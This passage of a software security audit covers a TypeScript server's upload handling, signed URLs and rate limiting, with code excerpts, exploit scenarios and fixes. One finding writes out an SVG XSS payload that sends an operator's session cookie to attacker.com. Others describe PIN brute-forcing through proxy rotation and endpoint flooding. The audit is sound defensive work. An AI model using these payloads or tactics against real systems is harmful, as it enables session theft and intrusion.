`entry.isSymbolicLink()` guard, no comment, and no test — a future Node.js behavioral change or a platform where `withFileTypes` returns stat-based results (e.g., Windows junction handling) could silently break the assumption.

**Code:**
```typescript
// tenantExport.ts:588-614
for (const entry of entries) {
  const absPath = path.resolve(dir, entry.name);
  // ZIP-slip guard
  if (!absPath.startsWith(resolvedBase + path.sep) && absPath !== resolvedBase) {
    // ... rejected
  }
  if (entry.isDirectory()) {                    // ← lstat-based; symlink-to-dir → false
    await collectUploads(absPath, resolvedBase, zipFiles); // ← recursive
  } else if (entry.isFile()) {                  // ← lstat-based; symlink-to-file → false
    data = await fsp.readFile(absPath);         // ← follows symlink if isFile() were true
    zipFiles.push({ name: `uploads/${rel}`, rawData: data });
  }
  // symlinks: silently skipped — but no explicit guard or comment
}
```

**Exploit:**
Under current Node.js behavior (lstat semantics for `withFileTypes`) symlinks are skipped and no data leaks. The risk is latent: a future change to `withFileTypes` semantics, or an operator adding `{ followSymlinks: true }` to the readdir call, would silently allow a symlink placed inside the uploads directory (by a malicious file upload or a misconfigured storage mount) to exfiltrate `/etc/shadow` or any file readable by the server process into the tenant's encrypted export ZIP.

**Fix:**
Add an explicit `entry.isSymbolicLink()` check and `continue` (or log-and-skip) before the `isDirectory` / `isFile` branches. Document the assumption: `// Symlinks are explicitly rejected — never follow outside the uploads root.` Mirrors the pattern already used in `management.routes.ts:317`.

---

### [LOW] `backup.ts` `fsp.cp` follows symlinks into backup destination if Node.js behavior changes

**Where:** `packages/server/src/services/backup.ts:630-632`

**What:**
The backup routine copies the entire uploads directory with `fsp.cp(config.uploadsPath, uploadsDest, { recursive: true })`. Node.js `fsp.cp` defaults to `dereference: false`, which preserves symlinks as symlinks (does not follow them) — the backup copy is a symlink pointing to the original target, not a copy of its contents. This is currently safe. However, the call has no explicit `dereference: false` option, so the behavior is implicit. If Node.js ever changes the default, or if a developer adds `{ dereference: true }` thinking it "ensures all files are copied", symlinks in the uploads directory would be followed and arbitrary files readable by the server process could land in the backup archive.

**Code:**
```typescript
// backup.ts:630-632
if (fs.existsSync(config.uploadsPath)) {
  await fsp.cp(config.uploadsPath, uploadsDest, { recursive: true });
  // No explicit dereference: false — relies on Node.js default
}
```

**Exploit:**
Requires a symlink already present inside the uploads directory (from a malicious upload or storage misconfiguration). Under current Node defaults the symlink is copied as-is; if `dereference` were true, sensitive system files pointed to by the symlink would be embedded in the backup and potentially exposed to whoever downloads it.

**Fix:**
Pass `{ recursive: true, dereference: false }` explicitly and add a comment: `// dereference: false — do not follow symlinks in uploads (prevents /etc/shadow leakage)`.

---

### [INFO] No archive extraction libraries present — zip-slip via entry filename is not applicable

**Where:** `packages/server/package.json`

**What:**
The server has no dependencies on `unzipper`, `adm-zip`, `yauzl`, `archiver`, `tar`, or any other archive extraction library. All ZIP handling is done by the custom pure-Node `buildZip()` writer in `tenantExport.ts` (write-only, no extraction path), `backup.ts` (SQLite `.backup()` API — no tar/zip), and `receiptOcr.ts` (reads files already on disk, no archive extraction). There is no code path where a user-supplied archive is extracted to disk, so there is no classic zip-slip / tar-slip / symlink-extraction attack surface via entry filename containing `../`.

**Fix:**
No action required. If an extraction flow is added in future, validate every entry name against the target directory using `path.resolve` + `startsWith(targetDir + path.sep)` before writing.

---

### [INFO] CSV formula injection is guarded in all export endpoints — confirmed

**Where:**
- `packages/server/src/routes/reports.routes.ts:1701-1703` — `CSV_FORMULA_TRIGGERS` + `sanitizeCsvCell`
- `packages/server/src/routes/tickets.routes.ts:1787-1791` — `CSV_FORMULA_TRIGGERS` + `escapeCsv` (SCAN-1161)
- `packages/server/src/routes/inventory.routes.ts:1892-1899` — inline `escCsv` with `/^[=+\-@\t\r]/` (SCAN-1161)
- `packages/server/src/routes/team.routes.ts:977-979` — `sanitize()` with `/^[=+\-@\t\r]/` (SCAN-1161)

**What:**
Every CSV export endpoint prefixes cells starting with `=`, `+`, `-`, `@`, TAB, or CR with a single quote before quoting, following the OWASP CSV injection defense. The pattern is consistently applied and code-commented with SCAN-1130/SCAN-1161 references. The `customers /import-csv` and `inventory /import-csv` endpoints accept JSON bodies (not raw CSV files), so there is no parse-time formula injection attack surface on the import side. No `papaparse` or `csv-parse` library is used.

**Fix:**
No action required. Consider extracting the three inline implementations into a shared `sanitizeCsvCell` utility to eliminate drift risk.

---

## SCOPE CLEARED — checklist of what was verified safe

- **Zip-slip via entry filename**: No archive extraction library in `package.json`; the only ZIP code is the pure-Node writer in `tenantExport.ts` which is write-only.
- **Symlink extraction in tenantExport ZIP builder**: `collectUploads` uses `lstat`-based `withFileTypes` — `isFile()` and `isDirectory()` both return `false` for symlinks, so no symlink content reaches the ZIP. Flagged as INFO for explicit guard recommendation.
- **Symlink in backup fsp.cp**: `dereference` defaults to `false`; symlinks are preserved, not followed. Flagged as LOW for explicit option.
- **Zip-bomb / entry count / size**: No extraction path exists, so unbounded entry count/size in a user-supplied archive is not applicable.
- **Tar pax extended headers**: No tar library, no tar extraction.
- **CSV formula injection (export)**: All four CSV export endpoints apply the single-quote prefix guard. Confirmed line citations above.
- **CSV formula injection (import)**: Both `/import-csv` endpoints (`customers`, `inventory`) receive pre-parsed JSON arrays from the client — the CSV file is parsed client-side and the rows POSTed as JSON. No server-side CSV parser processes raw formula cells.
- **receiptOcr path traversal**: `isPathUnder()` in `receiptOcr.ts:49-55` validates `file_path` from DB is under `uploadsPath` using `path.resolve` + `startsWith(base + path.sep)` before any read.
- **RepairDesk/RepairShopr/MyRepairApp import**: All three import services consume external API JSON, not user-supplied archive files. No archive extraction. All DB writes use parameterized SQLite prepared statements. No CSV formula injection path (data stays in DB, not streamed to CSV in these services).
- **dataExportGenerator**: Write-only JSON export. Table names come from `sqlite_master` and are validated with `/^[a-zA-Z_][a-zA-Z0-9_]*$/` before interpolation. No user-controlled strings in filenames.
- **backup.ts restore path**: `resolveBackupPath` checks `filename.includes('..')`, `filename.includes('/')`, `filename.includes('\\')`, and verifies the resolved path stays inside `backupDir`. The HMAC sidecar prevents cross-tenant restore. Integrity check via `PRAGMA integrity_check` runs before the DB file is swapped.
- **tenantTermination**: Operates on DB file rename/move within configured directories; no archive extraction, no CSV, no user-controlled filenames written to disk.
- **Unicode/RTLO in filenames**: No filenames from user input are written to disk in any archive extraction flow (there is no extraction flow). Upload filenames are validated by `fileUploadValidator.ts` before storage.


---

# S27-signed-uploads

# S27 — Signed Upload URLs / Pre-signed Download URLs

**Scope reviewed:**
- `packages/server/src/utils/signedUploads.ts`
- `packages/server/src/routes/expenseReceipts.routes.ts`
- `packages/server/src/routes/ticketSignatures.routes.ts`
- `packages/server/src/routes/estimateSign.routes.ts`
- `packages/server/src/routes/voice.routes.ts` (uses its own recording signed-URL scheme)
- `packages/server/src/index.ts` (signed-URL route handler + `/uploads` static serving)
- `packages/server/src/config.ts` (uploadsSecret, jwtSecret)
- `packages/server/src/middleware/fileUploadValidator.ts`
- `packages/server/src/utils/fileValidation.ts`
- `packages/server/src/db/migrations/126_estimate_signatures_export_schedules.sql`

---

### [HIGH] Estimate sign token HMAC always fails — ms-precision truncation

**Where:** `packages/server/src/routes/estimateSign.routes.ts:274–277` (sign) and `:399–400` (verify)

**What:**
`buildSignToken` computes the HMAC over the raw epoch-ms timestamp (`expiresTs = Date.now() + ttl_ms`). That timestamp is then written to SQLite via `sqlTimestamp()`, which truncates it to second precision (`YYYY-MM-DD HH:MM:SS`). On the verify path, `toEpochMs(tokenRow.expires_at)` reconstructs the epoch from the stored second-precision string. The reconstructed value differs from the original by `Date.now() % 1000` milliseconds, so the recomputed HMAC never matches the issued one unless the creation timestamp happened to land at exactly 000 ms (probability ≈ 1/1000).

**Code:**
```typescript
// Issue path — HMAC bound to ms-precision timestamp
const expiresTs = now + ttlMinutes * 60 * 1000;         // e.g. 1746259200123
const expiresAt = sqlTimestamp(new Date(expiresTs));     // "2025-05-03 09:20:00" (truncated!)
const rawToken = buildSignToken(estimateId, expiresTs);  // HMAC over "42.1746259200123"

// Verify path — HMAC recomputed over truncated (different) value
const expiresTs = toEpochMs(tokenRow.expires_at);       // 1746259200000 (no .123)
if (!verifySignTokenHmac(estimateId, expiresTs, givenHmac)) // "42.1746259200000" ≠ "42.1746259200123"
  throw new AppError('Sign link is invalid or has expired', 404);
```

**Exploit:**
No exploit needed — all legitimately issued estimate sign tokens are rejected with 404 ("Sign link is invalid or has expired"), making the e-sign feature completely non-functional except by rare timing coincidence. Customers cannot sign estimates via the public link.

**Fix:**
Align precision consistently. Either: (a) truncate `expiresTs` to seconds before building the token: `const expiresTs = Math.floor((now + ttlMinutes * 60 * 1000) / 1000) * 1000;`, or (b) embed `expires_at` as an integer seconds column (instead of TEXT) and round-trip via seconds arithmetic. Both `buildSignToken` and `sqlTimestamp` must operate at the same precision.

---

### [MEDIUM] Voice recording signed URLs reuse `jwtSecret` as HMAC key

**Where:** `packages/server/src/routes/voice.routes.ts:272` and `:343`

**What:**
The per-recording short-lived download token is signed with `config.jwtSecret` — the same secret used to sign all user session JWTs — rather than the dedicated `config.uploadsSecret` introduced in SEC-H54. A JWT secret compromise (via log leak, env export, debug endpoint, etc.) now additionally grants the ability to forge valid recording download tokens for arbitrary call IDs, meaning an attacker gains audio access alongside session access. The blast radius of a single key leak is unnecessarily broad.

**Code:**
```typescript
// GET /voice/calls/:id/recording-url — token issuance
const hmac = crypto
  .createHmac('sha256', config.jwtSecret)   // ← should be config.uploadsSecret or a dedicated key
  .update(`${callId}|${expires}`)
  .digest('hex');

// GET /voice/recording/:id — token verification
const expected = crypto
  .createHmac('sha256', config.jwtSecret)   // ← same issue
  .update(`${id}|${expiresStr}`)
  .digest('hex');
```

**Exploit:**
An attacker who obtains `JWT_SECRET` (e.g., from an exposed environment variable, a server-side debug endpoint, or a misconfigured secrets manager) can forge HMAC tokens with any `callId` and a future `expires`, then stream call recordings of any tenant without authentication.

**Fix:**
Use `config.uploadsSecret` (or derive a separate recording-access key via HKDF from it) for recording tokens. The key is already available and isolated from JWT signing per SEC-H54. Update both the issuance and verification sites in `voice.routes.ts`.

---

### [MEDIUM] SVG accepted as e-signature data URL — stored XSS vector

**Where:** `packages/server/src/routes/estimateSign.routes.ts:58–61` and `:526–529`

**What:**
The public e-sign endpoint accepts `data:image/svg+xml;base64,...` as a valid signature data URL. SVG documents can contain embedded `<script>` elements, `onload` event handlers, and `<foreignObject>` with HTML. The raw data URL (including any embedded SVG scripts) is stored verbatim in `estimate_signatures.signature_data_url`. If the admin panel ever renders this data URL in an unsafe context (e.g., as an `<img>` fallback, via `innerHTML`, or as an `<embed>` source), an attacker who controls the signer input can execute arbitrary JavaScript in the operator's browser session.

**Code:**
```typescript
const ACCEPTED_DATA_URL_PREFIXES = [
  'data:image/png;base64,',
  'data:image/svg+xml;base64,',  // ← SVG allows embedded scripts
];
// No sanitization of the decoded SVG content before DB insert (line 611)
```

**Exploit:**
A malicious customer submits a POST to `/public/api/v1/estimate-sign/:token` with `signature_data_url: "data:image/svg+xml;base64,<base64 of SVG with <script>fetch('https://attacker.com?c='+document.cookie)</script>>"`. If an operator views the signature in the admin UI and it is rendered unsafely, the script fires and exfiltrates the operator's session cookie.

**Fix:**
Remove `data:image/svg+xml;base64,` from `ACCEPTED_DATA_URL_PREFIXES`. Signatures should be raster images only (PNG or JPEG). If SVG is business-required, decode and sanitize with a server-side SVG sanitizer (e.g., DOMPurify in a Node JSDOM context) before storage, and ensure the frontend always renders signatures via sandboxed `<img>` elements (which browsers already sandbox for SVG).

---

### [MEDIUM] `signUploadUrl` HMAC uses raw filename; verifier receives URL-encoded filename

**Where:** `packages/server/src/utils/signedUploads.ts:65–70` (sign) and `:101` (verify)

**What:**
`signUploadUrl` computes the HMAC canonical string over the **raw (unencoded) `file`** argument but URL-encodes the file before embedding it in the returned URL path (`encodeURIComponent(file)` at line 69). The Express regex-route handler (`app.get(/^\/signed-url\/...$/`, `index.ts:1358`) receives path parameters as **raw URL captures without decoding**, so it passes the percent-encoded filename directly to `verifySignedUpload`. The verifier recomputes the HMAC over the percent-encoded string, which never matches the HMAC over the raw string. Any signed URL for a filename containing spaces, Unicode characters, or any `encodeURIComponent`-modified characters will fail verification. The function has zero callers in the current codebase, but the bug will silently break the first consumer added.

**Code:**
```typescript
// signUploadUrl — HMAC over raw file:
const canonical = canonicalString(type, slug, file, exp);  // e.g. "uploads|tenant|foo bar.jpg|exp"
const encodedFile = encodeURIComponent(file);               // "foo%20bar.jpg" in URL
return `/signed-url/.../foo%20bar.jpg?exp=...&sig=...`;

// verifySignedUpload called with req.params[2] = "foo%20bar.jpg" (no auto-decode in regex route):
const canonical = canonicalString(type, slug, file, exp);  // "uploads|tenant|foo%20bar.jpg|exp" ← MISMATCH
```

**Exploit:**
Any caller of `signUploadUrl` with a filename containing non-ASCII-safe characters generates a URL that the `/signed-url/` handler will always reject with 403 "Invalid signature". Effectively, signed URL delivery (email receipts, MMS media links, portal attachments) will be broken for any real-world filenames containing spaces or special characters.

**Fix:**
Normalise to a single representation throughout. Option A: HMAC canonical uses the **URL-encoded** form (`encodeURIComponent(file)`) — change line 65 to `const canonical = canonicalString(type, slug, encodedFile, exp)` (after computing `encodedFile`). Option B: the route handler decodes `req.params[2]` with `decodeURIComponent` before passing to `verifySignedUpload`. Option A is simpler and keeps the canonical string consistent with the URL.

---

### [LOW] No path-containment check on `recording_local_path` before file streaming

**Where:** `packages/server/src/routes/voice.routes.ts:291–298` and `:368–370`

**What:**
Both the token-authenticated recording endpoint (`GET /voice/recording/:id`) and the JWT-authenticated recording endpoint (`GET /voice/calls/:id/recording`) construct the file path as `path.join(config.uploadsPath, call.recording_local_path.replace(/^\/uploads\//, ''))` and stream the result without verifying the resolved path stays inside `config.uploadsPath`. In contrast, the `/signed-url/` handler in `index.ts:1385` does perform a `resolved.startsWith(baseDir)` check. If `recording_local_path` in the database ever contains a crafted value such as `../../../etc/passwd`, the file would be streamed to the caller. The path is written exclusively by the webhook handler with a controlled format (`/uploads/{slug}/recordings/call-{id}-{random}.mp3`), so exploitation requires prior database write access, but the defense-in-depth layer is absent.

**Code:**
```typescript
const filePath = path.join(
  config.uploadsPath,
  call.recording_local_path.replace(/^\/uploads\//, ''),  // no containment check
);
if (fs.existsSync(filePath)) {
  fs.createReadStream(filePath).pipe(res);  // ← could stream any file if path escapes
}
```

**Exploit:**
An attacker with the ability to write an arbitrary `recording_local_path` into `call_logs` (e.g., via a compromised tenant DB or future SQL-injection path) could set the path to `../../etc/hostname` and retrieve server filesystem files by fetching a recording URL with a valid HMAC token for that call ID.

**Fix:**
Add the same containment check already used in the `/signed-url/` handler: `if (!path.resolve(filePath).startsWith(path.resolve(config.uploadsPath))) throw new AppError('Forbidden', 403);`. Apply to both recording-serve code paths.

---

### [LOW] `image/heic` allowed in MIME whitelist but has no magic-byte signature entry

**Where:** `packages/server/src/routes/expenseReceipts.routes.ts:48–55` and `packages/server/src/utils/fileValidation.ts:56–88`

**What:**
`ALLOWED_RECEIPT_MIMES` includes `'image/heic'` and `ALLOWED_RECEIPT_EXTENSIONS` includes `'.heic'`. However, `fileValidation.ts::SIGNATURES` contains no entry for HEIC/HEIF. Every HEIC receipt upload passes multer's `fileFilter` (which only checks `file.mimetype`) and then hits `fileUploadValidator` which calls `validateFileOnDisk`. Since HEIC bytes don't match any registered signature, the call returns `{ valid: false, error: 'Unrecognized file signature' }` and the upload is rejected with 400. HEIC uploads are silently broken for all users.

**Code:**
```typescript
// expenseReceipts.routes.ts:48
const ALLOWED_RECEIPT_MIMES = [
  'image/jpeg', 'image/png', 'image/webp',
  'image/heic',  // ← accepted by fileFilter but rejected by magic-byte validator
];

// fileValidation.ts — no HEIC/HEIF entry in SIGNATURES array
const SIGNATURES: readonly Signature[] = [
  { type: 'jpeg', ... },
  { type: 'png', ... },
  { type: 'gif', ... },
  { type: 'webp', ... },
  { type: 'pdf', ... },
  // HEIC missing
];
```

**Exploit:**
No security exploit — this is a functional regression. iOS users who take photos in HEIC format cannot upload expense receipts. The upload appears to succeed at the UI level (multer accepts it) and then fails at the validation step with a confusing "file content does not match declared type" error.

**Fix:**
Add a HEIC/HEIF signature entry to `SIGNATURES`. HEIC files are ISO Base Media File Format containers; the magic bytes are `00 00 00 NN 66 74 79 70 68 65 69 63` (the `ftyp heic` box). A suitable entry: `{ type: 'heic', bytes: [null, null, null, null, 0x66, 0x74, 0x79, 0x70], allowedMimes: ['image/heic', 'image/heif'] }` with an `extraCheck` that confirms bytes 8–11 are `heic`, `heis`, `mif1`, or `msf1`.

---

### [INFO] `signUploadUrl` is exported but has zero callers — signed-URL upload path is dead code

**Where:** `packages/server/src/utils/signedUploads.ts:54–71`

**What:**
`signUploadUrl` is the issuing half of the signed-URL scheme. The verifying half (`verifySignedUpload`) is wired into `index.ts:1330` and serves the `/signed-url/*` endpoint. However, `signUploadUrl` is never imported or called anywhere in the codebase (confirmed by exhaustive grep across `packages/`). The endpoint exists and can verify signatures, but no code in the server ever generates them. Portal receipt links, MMS media links, and other intended callers (noted in the docblock) are currently non-functional and would need to be wired up.

**Fix:**
Not a security finding — tracking item. Wire callers for portal receipts, MMS media, and estimate attachments as noted in the SEC-H54 comment; or document the feature as planned-but-not-yet-implemented.

---

### [INFO] No signed-URL revocation mechanism; max TTL is 7 days

**Where:** `packages/server/src/utils/signedUploads.ts:29–31`

**What:**
The signed-URL scheme uses a stateless HMAC (no nonce/jti stored in DB). Once a URL is issued, it cannot be revoked before expiry. The maximum TTL is 7 days (`TTL_MAX_SECONDS = 7 * 24 * 60 * 60`). If a signed URL is leaked (e.g., in server logs, browser history sync, a forwarded email), any recipient can fetch the file for up to a week. The estimate sign tokens use a DB-backed `consumed_at` mechanism, but the generic signed-upload URLs do not.

**Fix:**
For high-sensitivity content (recordings, signed documents), consider storing issued URLs in a short-lived DB table keyed by a nonce, and invalidating on explicit delete or file removal. Alternatively, reduce the default TTL for sensitive types and document the 7-day max as a ceiling for exceptional cases only (e.g., MMS media that requires a long window for provider fetch).

---


---

# S28-rate-limit

# S28 — Rate Limiting Completeness Audit

**Slot:** 28  
**Auditor:** security-audit agent  
**Date:** 2026-05-05  
**Scope:** Rate limiting coverage across all sensitive endpoints

---

## Summary

Rate limiting is broadly implemented via a well-designed SQLite-backed `rateLimiter.ts` utility with both window-based and lockout-based modes. Trust-proxy is correctly configured (explicit IP allowlist, not `1`). Auth endpoints (login, 2FA, forgot/reset-password, change-password) all have dedicated per-IP and per-account limits. Public-facing endpoints (booking, portal, payment links, estimate sign) are individually rate-limited.

However, six concrete gaps were found:

---

### [MEDIUM] POST /auth/refresh has no rate limit — JWT flood/DoS

**Where:** `packages/server/src/routes/auth.routes.ts:1210`  
Also: `packages/server/src/index.ts:1183` (global limiter exclusion)

**What:**
`POST /api/v1/auth/refresh` is mounted under `/api/v1/auth` which is explicitly excluded from the global 300 req/min IP limiter (`req.path.startsWith('/auth')` short-circuits at index.ts:1183). The handler has zero dedicated rate limiting. Every call runs `verifyJwtWithRotation` (HMAC-SHA256) plus two async DB queries (session lookup, user lookup). An attacker can flood this endpoint with arbitrary tokens causing sustained CPU and SQLite I/O load.

**Code:**
```typescript
// index.ts:1181-1184 — entire /auth prefix is excluded
app.use('/api/v1', (req, res, next) => {
  if (req.path.startsWith('/auth') || ...) {
    return next();   // <-- /auth/refresh gets no global limit
  }
  const result = consumeWindowRate(limitDb, 'api_v1', ip, 300, 60_000);

// auth.routes.ts:1210 — handler starts with no rate check
router.post('/refresh', asyncHandler(async (req: Request, res: Response) => {
  // No checkWindowRate / consumeWindowRate call anywhere in this handler
  const payload = verifyJwtWithRotation(refreshToken, 'refresh', JWT_VERIFY_OPTIONS);
```

**Exploit:**
An attacker sends thousands of `POST /api/v1/auth/refresh` requests per second with random JWT-format bodies. Each triggers an HMAC-SHA256 verify attempt and a DB read. The global limiter does not fire (auth paths are excluded). The server becomes unavailable to legitimate users.

**Fix:**
Add `consumeWindowRate(db, 'refresh', ip, 60, 60_000)` at the start of the `/refresh` handler, returning 429 when exceeded. A per-IP ceiling of 60/min is generous enough for any real browser/mobile refresh cycle.

---

### [MEDIUM] POST /auth/switch-user — IP-only PIN rate limit, no per-user limit (distributed brute-force)

**Where:** `packages/server/src/routes/auth.routes.ts:1438-1445`  
Also: `auth.routes.ts:241-252` (PIN_RATE_LIMIT definition)

**What:**
The `/switch-user` endpoint enforces only a per-IP PIN rate limit (5 attempts / 15 min). There is no per-target-user rate limit. An attacker controlling multiple IPs (botnet, proxy rotation) can each contribute 5 attempts per 15-minute window, cumulatively brute-forcing a 4-digit (10,000 possibilities) or 6-digit (1,000,000) PIN with 2,000–200,000 IPs at 33 attempts/IP/hour. Contrast: the password login path has an additional per-account limit (10 attempts / 30 min keyed by tenantSlug:username).

**Code:**
```typescript
// auth.routes.ts:1438-1447 — only IP check, no per-user check
router.post('/switch-user', authMiddleware, asyncHandler(async (req, res) => {
  const ip = req.ip || req.socket.remoteAddress || 'unknown';
  if (!checkPinRateLimit(db, ip)) {   // keyed by IP only
    res.status(429).json({ ... });
    return;
  }
  // No per-user PIN attempt counter exists
  const user = usersWithPins.find(u => bcrypt.compareSync(pin, u.pin));
```

**Exploit:**
Attacker uses 100 residential proxies, each sending 5 wrong PINs per 15-min window = 100 attempts every 15 minutes = 400/hr continuously. A 4-digit PIN is enumerated within 25 hours on average. Technique is undetected because no single IP exceeds the limit.

**Fix:**
After a successful PIN match (user found but wrong TOTP, or on failure to match), record a per-user failure keyed by user.id in the `pin_user` category with the same 5/15-min window as the IP limit. Check this before running `bcrypt.compareSync` on the full user list.

---

### [MEDIUM] POST /catalog/live-search — shared in-memory global rate limit; single user can starve all others

**Where:** `packages/server/src/routes/catalog.routes.ts:697-712`  
Also: `packages/server/src/services/catalogScraper.ts:862-878`

**What:**
`POST /catalog/live-search` is protected only by an in-memory per-source global counter (30 req/min across ALL users). There is no per-user or per-tenant rate limit. A single authenticated technician or compromised account can exhaust all 30 slots in the shared bucket, making live catalog search unavailable for the entire shop. The in-memory counter resets on server restart, so it is also ineffective under orchestrated restart-then-flood attacks.

**Code:**
```typescript
// catalog.routes.ts:697 — no per-user check before calling liveSearchSupplier
router.post('/live-search', asyncHandler(async (req, res) => {
  const products = await liveSearchSupplier(db, source, q.trim());
  // catalogScraper.ts:865-877 — global in-memory counter only
  const liveSearchCounts = new Map<string, { count: number; resetAt: number }>();
  function rateLimitLiveSearch(source: CatalogSource): void {
    // One shared bucket per source — all users share this 30/min ceiling
    if (bucket.count >= LIVE_SEARCH_MAX) throw ...;
  }
```

**Exploit:**
An authenticated user (any role) scripts 30 rapid `POST /catalog/live-search` requests per minute. The global counter for that source reaches 30, and all other users in the shop receive 429 errors from `liveSearchSupplier` for the remainder of the window. Additionally, a server restart clears the counter, allowing immediate re-flood.

**Fix:**
Add `consumeWindowRate(req.db, 'catalog_live_search', String(req.user!.id), 10, 60_000)` at the start of the handler (per-user, 10/min). Retain the global service-level `rateLimitLiveSearch` counter as a secondary backstop.

---

### [LOW] checkWindowRate + recordWindowFailure split pattern creates TOCTOU race at auth limit boundary

**Where:** `packages/server/src/routes/auth.routes.ts:707,756` (login IP), `auth.routes.ts:1651,1681,1703` (forgot-password), `auth.routes.ts:1443,1481` (switch-user)  
Also: `packages/server/src/utils/rateLimiter.ts:53-58` (deprecated annotation)

**What:**
Fourteen route handlers use the deprecated `checkWindowRate` → async work → `recordWindowFailure` split pattern. Each function uses its own SQLite transaction, but there is an async gap between them (the handler awaits DB queries between check and record). At the limit boundary (e.g., count = maxAttempts-1), two concurrent requests can both pass `checkWindowRate` before either calls `recordWindowFailure`, allowing up to maxAttempts+1 attempts in a coordinated burst. The `consumeWindowRate` helper (used by newer routes) is atomic and does not have this race.

**Code:**
```typescript
// auth.routes.ts:707 — check (sync, count < 5 passes)
if (!checkLoginRateLimit(db, ip)) { return 429; }

// auth.routes.ts:733 — ASYNC GAP: second concurrent request's check runs here
const user = await adb.get('SELECT ... FROM users WHERE ...');

// auth.routes.ts:756 — record only on failure (sync)
recordLoginFailure(db, ip);  // now count = 1; second concurrent req still at 0
```

**Exploit:**
Attacker sends two concurrent POST /login requests from the same IP when the counter is at maxAttempts-1. Both pass the check. Each completes its async work (bcrypt + DB query). Each calls recordWindowFailure. Net result: counter advances by 2 but both requests were allowed through. At a 5-attempt limit, an attacker can effectively get 6 attempts per window. Practical impact is limited to +1 extra attempt per burst, not a bypass.

**Fix:**
Migrate all callers of `checkWindowRate`+`recordWindowFailure` to the atomic `consumeWindowRate`. The rateLimiter source already flags these as `@deprecated` (line 53). Priority callers: login IP (line 707/756), forgot-password (line 1651/1681), switch-user PIN (line 1443/1481).

---

### [LOW] POST /blockchyp/test-connection — admin-gated but no rate limit on real terminal network call

**Where:** `packages/server/src/routes/blockchyp.routes.ts:45-62`

**What:**
The `POST /blockchyp/test-connection` endpoint is gated to admin role but has no rate limit. Each call invokes `testConnection(db, terminalName)` which makes a real TLS network call to the BlockChyp payment terminal on the LAN or cloud. An admin account (or a session with a stolen admin JWT) can spam this endpoint, causing the terminal to be repeatedly pinged, potentially disrupting in-progress payment transactions by monopolising the terminal's connection queue.

**Code:**
```typescript
// blockchyp.routes.ts:45-62 — no rate limit check
router.post('/test-connection', asyncHandler(async (req, res) => {
  if (req.user?.role !== 'admin') throw new AppError('Admin access required', 403);
  // No consumeWindowRate / checkWindowRate call
  refreshClient();
  const result = await testConnection(db, terminalName); // real network call
  res.json({ success: result.success, data: result });
}));
```

**Exploit:**
A compromised admin account (or stolen admin JWT) repeatedly hits `POST /api/v1/blockchyp/test-connection` in a tight loop. The BlockChyp terminal receives hundreds of ping/test requests, potentially timing out in-flight payment captures on other routes.

**Fix:**
Add `consumeWindowRate(req.db, 'blockchyp_test', String(req.user!.id), 3, 60_000)` — 3 test attempts per minute per admin is sufficient for a legitimate "does this config work?" workflow.

---

### [INFO] geocode.routes.ts has no rate limit and is not mounted in index.ts

**Where:** `packages/server/src/routes/geocode.routes.ts:17-68`  
Also: `packages/server/src/index.ts` (no import or `app.use` for geocode)

**What:**
`geocode.routes.ts` exports a `GET /` route that proxies requests to Nominatim (OpenStreetMap's public geocoding API, no API key) with no per-user or per-IP rate limit. The route is never imported or mounted in `index.ts`, so it is currently dead code. If mounted in the future, unauthenticated callers (it uses `authMiddleware` on the route file? — actually no, the router itself has no auth middleware and is never mounted with one) could freely drive Nominatim requests, risking the server's IP being rate-limited or banned by Nominatim's 1 req/s policy.

**Code:**
```typescript
// geocode.routes.ts:17 — no auth, no rate limit
router.get('/', asyncHandler(async (req, res) => {
  const address = typeof req.query.address === 'string' ? req.query.address.trim() : '';
  // direct Nominatim call — no consumeWindowRate, no checkWindowRate
  const response = await fetch(url.toString(), { ... });
```

**Fix:**
Either remove the file or, before mounting, add `authMiddleware` and `consumeWindowRate(req.db, 'geocode', req.ip ?? 'unknown', 10, 60_000)` — 10 geocodes/min per IP is generous for an address-blur use case.

---

## Checklist Results

| Endpoint | Rate Limit | Notes |
|---|---|---|
| `POST /auth/login` | IP (5/15min) + per-account (10/30min) + captcha after 5 | PASS |
| `POST /auth/forgot-password` | IP (3/hr) + captcha after threshold | PASS |
| `POST /auth/reset-password` | IP (10/hr) | PASS |
| `POST /auth/login/2fa-verify` | IP (5/15min) + per-user lockout (5/15min) | PASS |
| `POST /auth/login/2fa-backup` | IP (5/15min) + per-user lockout (5/15min) | PASS |
| `POST /auth/account/2fa/disable` | per-user TOTP lockout | PASS |
| `POST /auth/recover-with-backup-code` | IP login limit (5/15min) | PASS |
| `POST /auth/refresh` | **NONE** | **FAIL — MEDIUM** |
| `POST /auth/switch-user` | IP only (5/15min) — no per-user | **PARTIAL — MEDIUM** |
| `POST /signup` | IP (3/hr) + per-email (3/hr) | PASS |
| `POST /sms/send` | per-user (5/min) + tenant daily cap (500/day) + per-destination (3/hr) | PASS |
| `POST /voice/call` | per-user (10/min) | PASS |
| `POST /public/api/v1/booking` (GET config/avail) | IP (60/hr, 120/hr) | PASS |
| `POST /portal/quick-track` | IP (10/15min) + per-order (5/hr) + per-phone4 (5/hr) | PASS |
| `POST /portal/register/send-code` | IP (1/5s) + per-phone (3/hr) + daily cap (10/day) | PASS |
| `POST /portal/login` | IP+hash(last4) (5/10min) | PASS |
| `POST /api/v1/public/payment-links/:token/pay` | IP (6/min) | PASS |
| `GET /api/v1/public/payment-links/:token` | IP (30/min) | PASS |
| `POST /catalog/sync` | per-user admin (3/hr) | PASS |
| `POST /catalog/live-search` | global in-memory (30/min all users) — no per-user | **FAIL — MEDIUM** |
| `POST /public/api/v1/estimate-sign` | IP (60/hr) | PASS |
| Geocode | No rate limit + NOT MOUNTED | **INFO** |
| `POST /blockchyp/test-connection` | admin-gated, no rate limit | **FAIL — LOW** |

---

## Trust Proxy / req.ip Verification

`app.set('trust proxy', TRUST_PROXY_ALLOWLIST)` at `index.ts:634` uses an explicit IP allowlist (`config.trustedProxyIps` + loopback), not the blanket `1`. This means `req.ip` only reflects the `X-Forwarded-For` header when the connection arrives from a trusted proxy IP. Direct connections from untrusted IPs use `req.socket.remoteAddress`, which cannot be spoofed. **No bypass via X-Forwarded-For is possible against the current configuration.**

## In-Memory vs Persistent Limiters

All auth-path limiters (`login_ip`, `login_user`, `totp`, `pin`, `forgot_password`, `reset_password`, `signup`) use the SQLite-backed `checkWindowRate`/`consumeWindowRate` and survive server restarts. The `catalog/live-search` limiter (`liveSearchCounts` in `catalogScraper.ts:864`) is in-memory and resets on restart — noted above as MEDIUM.

## Multi-Process Note

`rateLimiter.ts` explicitly states SQLite-backed limits work correctly in multi-process deployments (index.ts:1175-1177 comment). The in-memory `liveSearchCounts` map does NOT survive across processes or restarts — a second worker process would have its own 30/min ceiling.


---

# S29-headers-cors

